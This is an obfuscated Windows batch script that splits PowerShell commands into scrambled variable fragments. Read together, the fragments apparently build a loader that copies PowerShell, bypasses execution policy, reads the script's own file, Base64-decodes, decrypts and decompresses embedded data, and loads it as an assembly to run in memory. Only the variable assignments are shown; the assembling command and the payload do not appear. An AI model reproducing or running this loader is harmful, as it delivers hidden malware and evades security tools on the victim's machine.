@echo off
set "qLsdOqhZHd=we"
set "cVaMasopCx=do"
set "RGSjUpDYAc=s\"
set "DcwKmdROab=Wi"
set "znWJhDYpWy=py"
set "zKqJRLfeqW=.e"
set "oXdQnIlGlS=y "
set "CZhqXFBSrz= /"
set "LpQjheWqXy=ll"
set "agxktObAFH=we"
set "CenpxtZYck=nd"
set "iyfAQxQuGT=xe"
set "PQlBMyOXFZ=he"
set "JZDhpwMjoD=ll"
set "lAZMoDyHAu=\v"
set "sCqdDAlbsp=he"
set "BNnPnoZuTQ=Sy"
set "QayaJNMZuR=32"
set "tHMiEdpFyz=co"
set "bPuzBpxbGr=in"
set "FeZHVbgruN=rs"
set "tnKrksLswN=:\"
set "PotLOsAHQe=ws"
set "miLIverHXr=\W"
set "EEhcgbGYyt=Po"
set "AlpljVleuh=em"
set "QfLmXoQznj=po"
set "raINgtCoRQ= C"
set "QbfzCMvIKi=rS"
set "FXoqDAzRqp=1."
set "CjuIsAkWrx=0\"
set "tMpllCnODa=st"
set "BaOIglCFyO=ow"
set "LoXLQLzAba= %~dp0"
set "kOVFlRQZAL=cd"
set "PZuWdGAhJM=form"
set "syevtUIwVt=SIVj"
set "CsfOvZQVtC=F'[-"
set "ydYMttnjKo=stem"
set "qkiVYVUsjx=tem."
set "wIRlOXYdZH=y.Pa"
set "WaBSxeUUSL=[-1."
set "UwYWiBSHNz=join"
set "McNKMwoQZY=L) {"
set "aVyiohNjuk=Fina"
set "vgfqZBgQlH=e = "
set "ksQOaDnnPG='gni"
set "FCKufAhiGW=);$a"
set "OWoGkUsALc=);$a"
set "iHAAzvpRjc= [Sy"
set "vVOlDqxsrK=($YL"
set "YEbWuBDhiQ=Fo7l"
set "QerIAiAWhf=('da"
set "gVfDrNQdrL=esaB"
set "rtIBXNqiBO=wwr."
set "xhRVEwMcQM=V = "
set "rbyQQiHLDK= = ["
set "nborIJUGQV=ct S"
set "WhzmfQfJtE=urit"
set "sANSHzaJMa= if "
set "jkjPyQDepS=736u"
set "izaybuFQgt=[IO."
set "DpSGedZJUV=zpNr"
set "DyZQRcjAuj=m(, "
set "nfShXPFVuw=vert"
set "BVVezDEajj=in $"
set "LGQMVTvuFo===')"
set "BFPoaVypUx=.Com"
set "JTrdLFDdgK=rity"
set "PaZUCIQPgW=('%~f0'"
set "HlpTwkxoWH=$hZw"
set "jRDomUQKbG=E.En"
set "FCqPCkmgrl=  $d"
set "lEumKStKNy=.Con"
set "UwNIAHbljl=.Dis"
set "gpWkJAXsHD=-1.."
set "deMLvuzEyB=.Ass"
set "RrNKOcDJwK=null"
set "jlrzTxJLqB=iron"
set "UTePFFJpdD=.Mod"
set "ZtmmqKYjGK=comm"
set "LEuHUOYMBn=xiE "
set "csvAakYoYN=bypa"
set "uVSjNoFyXd=ateD"
set "WSRreWtjiS=, (,"
set "eqbZMIOkGM=morF"
set "ZLtRXxeGuH=oryS"
set "yoPTCtjLMq=New-"
set "fshoXQFVug=; };"
set "GjHADpdZBv=ress"
set "hVNjCMqCtF=nage"
set "gBiNViRlPJ=..-1"
set "qWxnSAihZa=n ''"
set "aTvbXFPjwr=ress"
set "xUOSmMuWNQ=oint"
set "ljyIyeYjkX= New"
set "auprIiFuqP= = N"
set "tyivdhMUMq=('l0"
set "MKsxquHZFE=();$"
set "yMyRQSktkv==');"
set "dpRagFibOl=Syst"
set "fMmHclHvIw=nirt"
set "rDRfIsdlOE=Ax.I"
set "vAUAUpTFUD=tsWi"
set "DLQsuWILMS=yTo("
set "SzCVdZAwfE=m.Re"
set "zoBlpIpVip=1] -"
set "ruYzwqCZxd=comp"
set "mdjkEDEQnO=.Cry"
set "ZFDkEteYCq=Secu"
set "sFJqQNaFsp=ew-O"
set "leAbNjdprg=$axA"
